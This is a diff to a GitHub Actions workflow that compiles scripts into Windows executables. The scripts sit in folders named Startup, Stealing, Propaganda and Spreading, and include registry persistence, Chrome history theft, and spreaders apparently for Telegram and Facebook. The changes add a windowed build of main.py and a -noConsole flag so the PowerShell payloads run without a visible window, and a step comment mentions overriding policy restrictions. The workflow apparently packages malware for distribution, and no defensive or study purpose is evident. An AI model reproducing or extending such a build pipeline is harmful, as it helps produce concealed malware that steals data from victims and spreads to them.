@@ -41,6 +41,7 @@ jobs:
         pyinstaller --onefile --windowed Startup/addtoregistrykey.py
         pyinstaller --onefile --windowed Startup/addtostartup.py
         pyinstaller --onefile --windowed Stealing/gethistoryChrome.py
+        pyinstaller --onefile --windowed main.py
 
     # Step 5: Override policy restrictions, install ps2exe, and compile PowerShell scripts
     - name: Install ps2exe and Build PowerShell EXEs
@@ -58,8 +59,8 @@ jobs:
         
         # Compile your PowerShell scripts into the root folder or a specific directory
         # (Replace 'script1.ps1' with your actual .ps1 filenames)
-        Invoke-ps2exe Propaganda/facebook.ps1 .\facebookrun.exe
-        Invoke-ps2exe Spreading/scriptmonouk.ps1 .\Telegramrun.exe
+        Invoke-ps2exe Propaganda/facebook.ps1 .\facebookrun.exe -noConsole
+        Invoke-ps2exe Spreading/scriptmonouk.ps1 .\Telegramrun.exe -noConsole
 
     # Step 6: Save all compiled files so you can download them from GitHub Actions panel
     - name: Upload Build Artifacts
